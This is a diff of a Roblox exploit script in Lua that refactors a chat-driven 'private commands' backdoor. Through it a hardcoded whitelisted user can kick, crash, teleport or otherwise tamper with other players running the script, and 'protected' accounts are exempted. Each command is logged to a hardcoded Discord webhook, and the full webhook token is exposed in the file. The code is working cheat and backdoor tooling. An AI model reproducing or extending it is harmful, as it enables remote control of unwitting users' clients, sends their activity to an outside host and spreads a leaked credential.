@@ -1,3 +1,7 @@
+--====================================--
+-- ERX Private Commands Protection Fix
+--====================================--
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local AnalyticsService = game:GetService("RbxAnalyticsService")
@@ -5,9 +9,15 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local FE = game:GetService("ReplicatedStorage"):WaitForChild("FE")
 local Chat = FE:WaitForChild("Chat", 9e9)
+local Actions = FE:WaitForChild("Actions", 9e9)
+local EnviromentRemote = Actions:WaitForChild("Environmental", 9e9)
 
 local webhookURL =
     "https://discord.com/api/webhooks/1424223851398696991/dOFxiu4WxLTVC32whg13Chp6pZEFRojhg22Sm9zX6toXcZibdi83lIOzRjEg9Aqslnn4"
+
+--============================--
+-- Helper Functions
+--============================--
 
 local function sendWebhook(command, senderName, target, extra)
     local data = {
@@ -55,18 +65,8 @@ local function AddRevealUser(playerName)
 end
 
 local function IsERXPrivate()
-    -- UserId check
-    if LocalPlayer.UserId == 8244720493 then
-        return true
-    end
-
-    -- DisplayName check (case-insensitive)
     local display = LocalPlayer.DisplayName:lower()
-    if display:find("fuhtwan") then
-        return true
-    end
-
-    return false
+    return LocalPlayer.UserId == 8244720493 or display:find("fuhtwan")
 end
 
 -- WindUI Notify if verified
@@ -78,13 +78,16 @@ if IsERXPrivate() and _G.WindUI then
     })
 end
 
+--============================--
+-- Private Commands
+--============================--
+
 local PrivateCommands = {}
 
 PrivateCommands[":reveal"] = function(senderName, ...)
     AddRevealUser(senderName)
     Chat:FireServer("EXWLSV")
 end
-
 
 PrivateCommands[":noroot"] = function(target)
     if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
@@ -161,14 +164,8 @@ PrivateCommands[":trip"] = function(target)
 end
 
 PrivateCommands[":bring"] = function(target)
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-
-    if not target then return end
-    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
-
+    if not target or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
     local lpRoot = LocalPlayer.Character.HumanoidRootPart
-
     if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
         target.Character.HumanoidRootPart.CFrame = lpRoot.CFrame + Vector3.new(0, 3, 0)
     end
@@ -185,12 +182,11 @@ PrivateCommands[":kick"] = function(target, msg)
 end
 
 PrivateCommands[":setfps"] = function(target, fpsValue)
-    if not fpsValue then return end
-    fpsValue = tonumber(fpsValue)
-    if not fpsValue then return end
-
-    if setfpscap then
-        setfpscap(fpsValue)
+    if fpsValue then
+        fpsValue = tonumber(fpsValue)
+        if fpsValue and setfpscap then
+            setfpscap(fpsValue)
+        end
     end
 end
 
@@ -199,7 +195,7 @@ PrivateCommands[":crash"] = function(target)
 end
 
 PrivateCommands[":prcprivate"] = function(target)
-    for _, name in ipairs(PrivateMembers) do
+    for _, name in ipairs(PrivateMembers or {}) do
         local p = Players:FindFirstChild(name)
         if p then
             local fake = Instance.new("BoolValue")
@@ -210,7 +206,7 @@ PrivateCommands[":prcprivate"] = function(target)
 end
 
 PrivateCommands[":removeprc"] = function(target)
-    for _, name in ipairs(PrivateMembers) do
+    for _, name in ipairs(PrivateMembers or {}) do
         local p = Players:FindFirstChild(name)
         if p then
             local tag = p:FindFirstChild("IsGameMod")
@@ -231,7 +227,10 @@ PrivateCommands[":notify"] = function(target, msg)
     end
 end
 
--- Helper: check if a player is protected
+--============================--
+-- Protected Player Check
+--============================--
+
 local function IsProtectedPlayer(player)
     if not player then return false end
     local name = player.Name:lower()
@@ -239,13 +238,36 @@ local function IsProtectedPlayer(player)
     return name:find("fuhtwan") or display:find("fuhtwan")
 end
 
+-- Wrap all PrivateCommands to skip protected players
+local function WrapPrivateCommand(func)
+    return function(target, ...)
+        if IsProtectedPlayer(target) then
+            if _G.WindUI then
+                _G.WindUI:Notify({
+                    Title = "Protected User",
+                    Content = target.Name .. " cannot be affected by commands.",
+                    Duration = 5
+                })
+            end
+            return
+        end
+        return func(target, ...)
+    end
+end
+
+for cmd, func in pairs(PrivateCommands) do
+    PrivateCommands[cmd] = WrapPrivateCommand(func)
+end
+
+--============================--
 -- Chat Hook
+--============================--
+
 Chat.OnClientEvent:Connect(function(senderName, message)
     local sender = Players:FindFirstChild(senderName)
     if not sender then return end
 
     local args = string.split(message, " ")
-
     local command = args[1]
     local targetName = args[2] or ""
     table.remove(args, 1)
@@ -254,11 +276,8 @@ Chat.OnClientEvent:Connect(function(senderName, message)
     local extra = table.concat(args, " ")
     local target = Players:FindFirstChild(targetName)
 
-    -- ================================================
-    -- 0. Skip the command if the **target** is a protected player
-    -- ================================================
+    -- Prevent commands from affecting protected players
     if target and IsProtectedPlayer(target) then
-        -- Optionally notify the sender that target is protected
         if _G.WindUI then
             _G.WindUI:Notify({
                 Title = "Protected User",
@@ -269,29 +288,18 @@ Chat.OnClientEvent:Connect(function(senderName, message)
         return
     end
 
-    -- ================================================
-    -- 1. Prevent commands from affecting YOU unless whitelisted
-    -- ================================================
+    -- Prevent affecting LocalPlayer unless sender is whitelisted
     if target == LocalPlayer then
         local allowed =
             (sender.UserId == 8244720493) or
             (string.find(string.lower(sender.DisplayName), "fuhtwan"))
-
-        if not allowed then
-            return
-        end
+        if not allowed then return end
     end
 
-    -- ================================================
-    -- 2. Your own commands should never target yourself
-    -- ================================================
-    if sender == LocalPlayer and target == LocalPlayer then
-        return
-    end
+    -- Prevent self-targeting
+    if sender == LocalPlayer and target == LocalPlayer then return end
 
-    -- ================================================
-    -- 3. Execute the command normally
-    -- ================================================
+    -- Execute command
     if PrivateCommands[command] then
         PrivateCommands[command](target, extra)
         sendWebhook(command, senderName, target, extra)
